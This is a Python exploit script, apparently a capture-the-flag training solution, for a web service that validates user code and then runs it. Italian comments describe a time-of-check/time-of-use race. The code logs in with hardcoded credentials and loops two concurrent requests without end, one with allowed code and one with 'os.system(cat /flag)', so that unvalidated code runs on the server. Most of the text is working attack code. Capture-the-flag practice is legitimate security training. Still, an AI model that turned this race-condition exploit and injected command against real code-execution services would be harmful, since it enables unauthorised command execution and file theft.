'''
La challenge ci chiede di leggere il file /flag dal server.
In views.py c'è una funzione run() che prende roba dalla post (il codice che scrivo) e il codice va nel file path e
poi c'è una validation del codice. 
La validation apre il file, lo parsa attraverso la libreria logging e poi controlla se il codice è nella allow list.
Se il codice è valido viene runnato con un timeout di 1 secondo e printa l'output.
VULNERABILITY: time of check - time of use: quando controllo il contenuto va bene ma quando lo uso potrebbe essere cambiato.
Visto che un utente scrive sempre sullo stesso file potrei mandare un'altra richiesta per modificare lo stesso file dopo il controllo.
'''

import requests
import random
import string
import threading
import time

#stringa = print(open(/flag).read())

baseurl = "http://pybook.training.jinblack.it" 

def login(session,username, password):
    url = "%s/login" % baseurl
    data = {"username": username, "password": password} 
    r = session.post(url, data=data)
    return r.text

def runCode1(session):
    url = "%s/run" % baseurl
    data = "print('ciao')"  # Così perchè non vuole parametri
    r = session.post(url, data=data)
    print(r.text)     # Questa va printata perchè è lei che verrà modificata e poi conterrà il flag
    return r.text

def runCode2(session):
    url = "%s/run" % baseurl
    data = "import os\nos.system('cat /flag')\n"
    r = session.post(url, data=data)
    #print(r.text)
    return r.text

s = requests.Session()
u = 'fantantonio'
p = 'Cassano'

login(s,u,p)


while True:                
    t1 = threading.Thread(target=runCode1, args=[s])
    t2 = threading.Thread(target=runCode2, args=[s])


    t1.start()
    t2.start()

    t1.join()
    t2.join()
    time.sleep(0.1)


    





